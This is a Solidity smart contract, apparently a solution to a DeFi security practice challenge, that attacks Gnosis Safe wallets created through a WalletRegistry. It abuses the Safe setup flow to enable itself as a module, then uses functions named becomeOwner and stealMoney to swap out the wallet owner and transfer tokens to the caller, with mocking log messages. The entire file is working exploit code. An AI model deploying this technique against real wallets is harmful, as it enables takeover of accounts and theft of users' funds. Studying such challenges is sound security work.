pragma solidity ^0.8.0;

import "./WalletRegistry.sol";

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "@gnosis.pm/safe-contracts/contracts/common/Enum.sol";

import "hardhat/console.sol";


contract AaronPwn {


    constructor() {
    }


    receive() payable external {}
    fallback() external payable {}


    function setup(
        address[] calldata _owners,
        uint256 _threshold,
        address to,
        bytes calldata data,
        address fallbackHandler,
        address paymentToken,
        uint256 payment,
        address payable paymentReceiver
    ) external {
        console.log("bruh from AaronPwn");
    }

    function test(address addy) external {
        console.log("NO FRICKIN WAY WE got to test(%s) via %s", addy, address(this));
        address(this).call(abi.encodeWithSignature("enableModule(address)", addy));
    }

    function execTransaction(address addy, address to, uint256 value, bytes memory data) public {
        //addy.call(abi.encodeWithSignature("execTransactionFromModule(address,uint256,bytes memory,Enum.Operation)", to, value, data, Enum.Operation.Call));
        ModuleManager mm = ModuleManager(addy);
        mm.execTransactionFromModule(to, value, data, Enum.Operation.Call);
        console.log("kk done with exec txn");
    }

    function becomeOwner(address addy, address currentOwner) external {
        execTransaction(addy,
            addy,
            0,
            abi.encodeWithSignature(
                "swapOwner(address,address,address)",
                address(0x1),
                currentOwner,
                msg.sender
            )
        );
    }

    function getWallet(address _registry, address owner) public returns (address) {
        WalletRegistry registry = WalletRegistry(_registry);
        return registry.wallets(owner);
    }


    function stealMoney(address registry, address owner, address token) public {
        console.log("lmao u really trusted dEcEnTrAlIzAtIoN with ur $$");
        bytes memory data = abi.encodeWithSignature("transfer(address,uint256)", msg.sender, 10 ether);
        //require(manager.execTransactionFromModule(token, 0, data, Enum.Operation.Call), "Could not execute token transfer");
        address owner = getWallet(registry, owner);
        console.log("stealMoney: OWNER: %s", owner);
        execTransaction(owner, token, 0, data);
    }
}
